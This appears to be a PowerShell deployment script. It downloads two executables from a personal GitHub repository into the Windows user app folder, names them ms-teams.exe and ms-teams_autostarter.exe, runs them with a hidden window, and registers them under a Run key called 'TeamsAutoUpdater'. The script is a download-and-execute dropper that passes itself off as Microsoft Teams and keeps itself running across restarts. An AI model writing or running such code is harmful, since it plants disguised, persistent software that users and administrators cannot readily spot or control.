$targetDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$exePath = "$targetDir\ms-teams.exe"
$scriptPath = "$targetDir\ms-teams_autostarter.exe"

$exeUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/refs/heads/main/ms-teams.exe"
$ahkUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/refs/heads/main/ms-teams_autostarter.exe"

do {
    $choice = Read-Host "Enter OW for Waheed or MH for Hashad"
} until ($choice -in @('OW', 'MH', 'ow', 'mh'))

$laptopId = if ($choice -match 'OW') { "Waheed" } else { "Hashad" }

Stop-Process -Name "ms-teams", "ms-teams_autostarter", "AutoHotkey" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

if (Test-Path $exePath) { Remove-Item $exePath -Force }
if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }

$cb = Get-Random

Invoke-WebRequest -Uri "$exeUrl?t=$cb" -Headers @{"Cache-Control"="no-cache"} -OutFile $exePath

$ahkContent = Invoke-RestMethod -Uri "$ahkUrl?t=$cb" -Headers @{"Cache-Control"="no-cache"}
$ahkContent = $ahkContent.Replace("###LAPTOP_ID###", $laptopId)

Set-Content -Path $scriptPath -Value $ahkContent -Encoding UTF8

Start-Process -FilePath $exePath -ArgumentList "`"$scriptPath`"" -WindowStyle Hidden

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValue = "`"$exePath`" `"$scriptPath`""
Set-ItemProperty -Path $regPath -Name "TeamsAutoUpdater" -Value $regValue
